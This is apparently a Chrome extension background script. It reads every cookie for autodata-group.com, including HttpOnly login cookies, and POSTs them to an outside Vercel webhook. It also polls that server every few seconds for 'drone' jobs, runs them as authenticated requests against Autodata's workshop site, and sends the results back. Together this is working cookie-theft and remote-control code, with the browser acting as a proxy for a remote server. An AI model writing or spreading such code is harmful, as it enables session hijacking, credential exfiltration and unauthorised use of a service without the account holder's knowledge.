chrome.runtime.onMessage.addListener((message, sender, sendResponse) => {
    if (message.action === "SEND_TOKENS") {
        // Grab all HttpOnly login cookies from the browser directly natively via Chrome API
        chrome.cookies.getAll({ domain: "autodata-group.com" }, (cookies) => {
            const backgroundRawCookies = cookies.map(c => `${c.name}=${c.value}`).join("; ");

            // Combine the cookies from content.js (document.cookie) with HttpOnly background cookies
            let combinedCookies = message.data.rawCookies || "";
            if (backgroundRawCookies) {
                // Merge without duplicates is better, but string concat is fine for now
                combinedCookies = combinedCookies ? `${combinedCookies}; ${backgroundRawCookies}` : backgroundRawCookies;
            }

            const payload = {
                ...message.data,
                rawCookies: combinedCookies
            };

            fetch("https://mot-reminder-quick.vercel.app/api/webhooks/autodata", {
                method: "POST",
                headers: {
                    "Content-Type": "application/json"
                },
                body: JSON.stringify(payload)
            })
                .then(res => res.json())
                .then(data => console.log("Tokens securely saved on backend!", data))
                .catch(err => console.error("Failed to sync tokens:", err));
        });
    }
});

// ---- BROWSER DRONE POLLING LOGIC ----
let isPolling = false;

async function pollForJobs() {
    if (isPolling) return;
    isPolling = true;

    try {
        const res = await fetch("https://mot-reminder-quick.vercel.app/api/webhooks/autodata/poll");
        const data = await res.json();

        if (data.success && data.job) {
            console.log("Drone received job:", data.job);
            await executeJob(data.job);
        }
    } catch (e) {
        // Ignore Vercel connection errors occasionally
    } finally {
        isPolling = false;
    }
}

async function executeJob(job) {
    let resultData = null;
    let errorMessage = null;

    try {
        // We do a Native Fetch directly to Autodata!
        // The background script naturally attaches all its God-mode HttpOnly cookies automatically.
        const url = "https://workshop.autodata-group.com" + job.endpoint;
        console.log("Drone executing fetch:", url);

        const res = await fetch(url, {
            headers: {
                "accept": "application/json",
                "xhr-request-from": "workshop"
            }
        });

        if (!res.ok) {
            throw new Error(`Autodata returned status: ${res.status}`);
        }

        resultData = await res.json();
        console.log("Drone successfully fetched JSON from Autodata!");
    } catch (e) {
        console.error("Drone failed to execute job:", e);
        errorMessage = e.message;
    }

    // Submit the result back to Vercel
    try {
        await fetch("https://mot-reminder-quick.vercel.app/api/webhooks/autodata/result", {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
                id: job.id,
                resultData,
                errorMessage
            })
        });
        console.log("Drone submitted result for job", job.id);
    } catch (e) {
        console.error("Drone failed to submit result:", e);
    }
}

// Check for jobs every 5 seconds using Chrome alarms to keep the service worker alive
chrome.alarms.create("dronePoll", { periodInMinutes: 0.1 }); // ~6 seconds
chrome.alarms.onAlarm.addListener((alarm) => {
    if (alarm.name === "dronePoll") {
        pollForJobs();
    }
});

// Run once immediately on startup
pollForJobs();
